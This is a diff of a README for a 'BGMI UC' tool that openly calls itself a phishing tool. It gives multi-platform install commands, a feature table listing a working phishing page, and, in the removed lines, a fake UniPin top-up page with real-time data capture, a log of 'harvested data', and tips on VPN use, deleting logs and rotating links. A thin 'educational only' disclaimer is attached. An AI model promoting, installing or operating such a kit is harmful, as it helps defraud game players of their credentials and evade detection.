@@ -5,96 +5,129 @@
 
 🔥 DGTL BGMI UC TOOL 🔥
 
-Developer: Aryan Afridi | Team: DIGITAL CYBER Official
+  <p align="center">
+    <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=30&duration=3000&pause=500&color=F7005C&center=true&vCenter=true&width=500&lines=DGTL+BGMI+Phishing+Tool;Cloudflare+Tunnel+Powered;By+Aryan+Afridi" alt="Typing SVG" />
+  </p>
 
-https://img.shields.io/badge/YouTube-@aryanafridi00-red?style=for-the-badge&logo=youtube
-https://img.shields.io/badge/GitHub-aryanafridi-blue?style=for-the-badge&logo=github
-https://img.shields.io/badge/Website-DGTL_CYBER-green?style=for-the-badge&logo=netlify
-
-</div>
+  <p align="center">
+    <img src="https://img.shields.io/github/stars/shahid2005a/DGTL-BGMI?style=for-the-badge&logo=github&color=yellow" />
+    <img src="https://img.shields.io/github/forks/shahid2005a/DGTL-BGMI?style=for-the-badge&logo=github&color=blue" />
+    <img src="https://img.shields.io/github/issues/shahid2005a/DGTL-BGMI?style=for-the-badge&logo=github&color=red" />
+    <br />
+    <img src="https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white" />
+    <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS%20%7C%20Termux-brightgreen?style=for-the-badge" />
+    <img src="https://img.shields.io/badge/Tunnel-Cloudflare-orange?style=for-the-badge&logo=cloudflare" />
+    <img src="https://img.shields.io/badge/License-Educational%20Only-red?style=for-the-badge" />
+    <br />
+    <img src="https://img.shields.io/badge/Made%20with-%E2%9D%A4%EF%B8%8F-ff69b4?style=for-the-badge" />
+    <img src="https://img.shields.io/badge/Version-2.0-important?style=for-the-badge" />
+  </p>
 
 ---
 
-⚡ Quick Install (One Line)
+📱 Complete Installation Commands
 
-📱 Termux
+📲 Termux (Android)
 
 ```bash
-pkg update && pkg upgrade -y; termux-setup-storage; pkg install python git -y; pkg install cloudflared -y; pip install pyperclip; git clone https://github.com/shahid2005a/DGTL-BGMI.git; cd DGTL-BGMI && python main.py
+pkg update && pkg upgrade -y
+termux-setup-storage
+pkg install python git -y
+pkg install cloudflared -y
+pip install pyperclip
+git clone https://github.com/shahid2005a/DGTL-BGMI.git
+cd DGTL-BGMI
+python main.py
 ```
 
-💻 Linux/Kali
+💻 Ubuntu/Debian/Kali Linux
 
 ```bash
-sudo apt update && sudo apt upgrade -y; sudo apt install python3 python3-pip git -y; pip3 install pyperclip; git clone https://github.com/shahid2005a/DGTL-BGMI.git; cd DGTL-BGMI && python3 main.py
+sudo apt update && sudo apt upgrade -y
+sudo apt install python3 python3-pip git -y
+sudo apt install cloudflared -y
+pip3 install pyperclip
+git clone https://github.com/shahid2005a/DGTL-BGMI.git
+cd DGTL-BGMI
+python3 main.py
+```
+
+🐧 Fedora/RHEL/CentOS
+
+```bash
+sudo dnf update -y
+sudo dnf install python3 python3-pip git -y
+sudo dnf install cloudflared -y
+pip3 install pyperclip
+git clone https://github.com/shahid2005a/DGTL-BGMI.git
+cd DGTL-BGMI
+python3 main.py
 ```
 
 🍎 macOS
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"; brew install python git; pip3 install pyperclip; git clone https://github.com/shahid2005a/DGTL-BGMI.git; cd DGTL-BGMI && python3 main.py
-```
-
-🪟 Windows (PowerShell as Admin)
-
-```powershell
-python -m pip install pyperclip; git clone https://github.com/shahid2005a/DGTL-BGMI.git; cd DGTL-BGMI; python main.py
-```
-
----
-
-📋 Detailed Setup Guide
-
-🔹 Termux Setup (Android)
-
-```bash
-# Update packages
-pkg update && pkg upgrade -y
-
-# Install dependencies
-pkg install python git cloudflared -y
-
-# Install Python packages
-pip install pyperclip
-
-# Clone tool
-git clone https://github.com/shahid2005a/DGTL-BGMI.git
-cd DGTL-BGMI
-
-# Run tool
-python main.py
-```
-
-🔹 Windows Setup
-
-```cmd
-# Install Python from: https://www.python.org/downloads/
-
-# Install dependencies
-pip install pyperclip
-
-# Clone tool
-git clone https://github.com/shahid2005a/DGTL-BGMI.git
-cd DGTL-BGMI
-
-# Run
-python main.py
-```
-
-🔹 Linux/Kali Setup
-
-```bash
-# Install dependencies
-sudo apt update
-sudo apt install python3 python3-pip git -y
-
-# Install Python packages
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+brew install python git
+brew install cloudflared
 pip3 install pyperclip
-
-# Clone and run
 git clone https://github.com/shahid2005a/DGTL-BGMI.git
 cd DGTL-BGMI
 python3 main.py
+```
+
+🪟 Windows (CMD as Administrator)
+
+```cmd
+python -m pip install pyperclip
+git clone https://github.com/shahid2005a/DGTL-BGMI.git
+cd DGTL-BGMI
+python main.py
+```
+
+🪟 Windows (PowerShell as Administrator)
+
+```powershell
+python -m pip install pyperclip
+git clone https://github.com/shahid2005a/DGTL-BGMI.git
+cd DGTL-BGMI
+python main.py
+```
+
+📦 Arch Linux/Manjaro
+
+```bash
+sudo pacman -Syu
+sudo pacman -S python python-pip git
+sudo pacman -S cloudflared
+pip install pyperclip
+git clone https://github.com/shahid2005a/DGTL-BGMI.git
+cd DGTL-BGMI
+python main.py
+```
+
+🐚 OpenSUSE
+
+```bash
+sudo zypper refresh
+sudo zypper install python3 python3-pip git
+sudo zypper install cloudflared
+pip3 install pyperclip
+git clone https://github.com/shahid2005a/DGTL-BGMI.git
+cd DGTL-BGMI
+python3 main.py
+```
+
+🔴 Termux (Alternative - One Line)
+
+```bash
+pkg update && pkg upgrade -y && termux-setup-storage && pkg install python git cloudflared -y && pip install pyperclip && git clone https://github.com/shahid2005a/DGTL-BGMI.git && cd DGTL-BGMI && python main.py
+```
+
+🔵 Linux (Alternative - One Line)
+
+```bash
+sudo apt update && sudo apt upgrade -y && sudo apt install python3 python3-pip git cloudflared -y && pip3 install pyperclip && git clone https://github.com/shahid2005a/DGTL-BGMI.git && cd DGTL-BGMI && python3 main.py
 ```
 
 ---
@@ -108,7 +141,7 @@ Feature Status
 ✅ Multi-Platform Support Working
 ✅ Real-time Logs Working
 ✅ Auto URL Copy Working
-✅ Phishing Page Premium
+✅ Phishing Page Premium Working
 
 ---
 
@@ -121,6 +154,8 @@ Issue Solution
 ❌ No module 'pyperclip' Run pip install pyperclip
 ❌ Tunnel not working Check internet, wait 30s
 ❌ Port in use Change port in script
+❌ git: command not found Install git: pkg install git or apt install git
+❌ cloudflared: not found Install: pkg install cloudflared or apt install cloudflared
 
 ---
 
@@ -148,166 +183,84 @@ This tool is for EDUCATIONAL PURPOSES only!
 3. ✅ Follow local laws and regulations
 4. ✅ Take full responsibility for your actions
 
-"With great power comes great responsibility"
-
 </div>
 
 ---
 
-📸 Screenshots
-
-Main Menu
-
-```bash
-[+] DGTL BGMI UC TOOL ACTIVE
-[1] Start Phishing (Auto Tunnel)
-[2] View Logs
-[3] Exit
-```
-
-Phishing Page
-
-· ✅ Realistic UniPin Interface
-· ✅ Multiple UC Packages
-· ✅ Auto Tunnel Generation
-· ✅ Real-time Data Capture
-
----
-
-🔐 Security Tips
-
-1. 🌐 Use VPN for anonymity
-2. 🧹 Clear browser history after use
-3. 🗑️ Delete logs after harvesting
-4. 🔒 Use HTTPS for better security
-5. 🤫 Don't share your URL publicly
-6. 🔄 Change links regularly
-
----
-
-📊 Project Structure
-
-```
-DGTL-BGMI/
-├── main.py          # Main script
-├── data.log         # Harvested data
-├── cloudflared      # Tunnel binary
-├── requirements.txt # Dependencies
-├── README.md        # Documentation
-├── setup.sh         # Linux install
-└── setup.ps1        # Windows install
-```
-
----
-
-🎯 Quick Commands
-
-```bash
-# Start tool
-python main.py
-
-# Run in background (Linux)
-nohup python main.py > output.log 2>&1 &
-
-# Run with screen
-screen -S bgmi
-python main.py
-# Ctrl+A+D to detach
-
-# View logs
-tail -f data.log
-
-# Clear logs
-> data.log
-```
-
----
-
-🌐 Connect With Us
+🤝 Contributing & Support
 
 <div align="center">
+  <table>
+    <tr>
+      <td><b>Developer</b></td>
+      <td>Aryan Afridi</td>
+    </tr>
+    <tr>
+      <td><b>YouTube</b></td>
+      <td>@aryanafridi00</td>
+    </tr>
+    <tr>
+      <td><b>GitHub</b></td>
+      <td>shahid2005a</td>
+    </tr>
+    <tr>
+      <td><b>Website</b></td>
+      <td>dgtlcyber.netlify.app</td>
+    </tr>
+  </table>
+</div>
 
-Platform Link
-📺 YouTube @aryanafridi00
-🌐 Website DGTL Cyber
-📱 Telegram @GsmhackerBot
-💬 WhatsApp Join Group
-📢 WhatsApp Channel Follow Us
-🐙 GitHub shahid2005a
+<p align="center">
+  If you find this tool useful, please ⭐ the repository and follow for more security research projects!
+</p>
 
+---
+
+📌 Contact Me
+
+<p align="center">
+  <a href="https://dgtlcyber.netlify.app/">
+    <img src="https://img.shields.io/badge/dgtlcyber-Website-2ea44f?style=for-the-badge&logo=link&logoColor=white" alt="Website">
+  </a>
+  <a href="https://www.youtube.com/@aryanafridi00">
+    <img src="https://img.shields.io/badge/Aryan Afridi YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube">
+  </a>
+  <a href="https://t.me/GsmhackerBot">
+    <img src="https://img.shields.io/badge/Telegram Bot-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
+  </a>
+</p>
+
+---
+
+⚡ DGTL CYBER – Join the Family
+
+<div align="center" style="background: #0a0a0a; padding: 20px; border-radius: 15px;">
+  <a href="https://chat.whatsapp.com/JhSEMaGzYk4GbkvEr2i6WI" target="_blank" style="background: #25D366; color: white; padding: 12px 30px; margin: 10px; display: inline-block; border-radius: 30px; text-decoration: none; font-weight: bold;">
+    💬 Join Group
+  </a>
+  <a href="https://whatsapp.com/channel/0029VbD1uw37T8bQVsv5gc2n" target="_blank" style="background: #075E54; color: white; padding: 12px 30px; margin: 10px; display: inline-block; border-radius: 30px; text-decoration: none; font-weight: bold;">
+    📢 Follow Channel
+  </a>
+  <br><br>
+  <span style="color: #888;">Stay Updated. Stay Secure. 🔵</span>
 </div>
 
 ---
 
-📱 Contact Developer
+<p align="center">
+  <b>🚀 Stay Ethical, Stay Safe! 🚀</b>
+</p>
 
-<div align="center">
+<p align="center">
+  <i>"Learn to protect, not to attack"</i>
+</p>
 
-Aryan Afridi
-Founder - DIGITAL CYBER Official
+<p align="center">
+  <sub>Made with ❤️ by DGTL CYBER Official</sub>
+</p>
 
-https://img.shields.io/badge/Email-shahid2005afridi@gmail.com-D14836?style=for-the-badge&logo=gmail
-https://img.shields.io/badge/Telegram-@aryanafridi-26A5E4?style=for-the-badge&logo=telegram
-https://img.shields.io/badge/Instagram-@shahid__afridi__as-E4405F?style=for-the-badge&logo=instagram
-
-</div>
-
----
-
-💝 Support Us
-
-<div align="center">
-
-https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black
-https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white
-https://img.shields.io/badge/UPI-aryanafridi@upi-4CAF50?style=for-the-badge&logo=googlepay
-
-</div>
-
----
-
-📜 License
-
-```
-MIT License
-
-Copyright (c) 2024 DGTL CYBER Official
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND
-```
-
----
-
-⭐ Star Us
-
-<div align="center">
-
-If you like this tool, please ⭐ star the repository!
-
-https://img.shields.io/github/stars/shahid2005a/DGTL-BGMI?style=for-the-badge&color=yellow
-https://img.shields.io/github/forks/shahid2005a/DGTL-BGMI?style=for-the-badge&color=blue
-https://img.shields.io/github/watchers/shahid2005a/DGTL-BGMI?style=for-the-badge&color=green
-
-</div>
-
----
-
-<div align="center">
-  <img src="https://github.com/shahid2005a/DGTL-BGMI/blob/main/DGTL%20BGMI/BGMI.png" alt="Footer Logo" width="200">
-
-🚀 Stay Ethical, Stay Safe! 🚀
-
-"Learn to protect, not to attack"
-
-<sub>Made with ❤️ by DGTL CYBER Official</sub>
-
-⬆ Back to Top
+<p align="center">
+  <a href="#top">⬆ Back to Top</a>
+</p>
 
 </div>
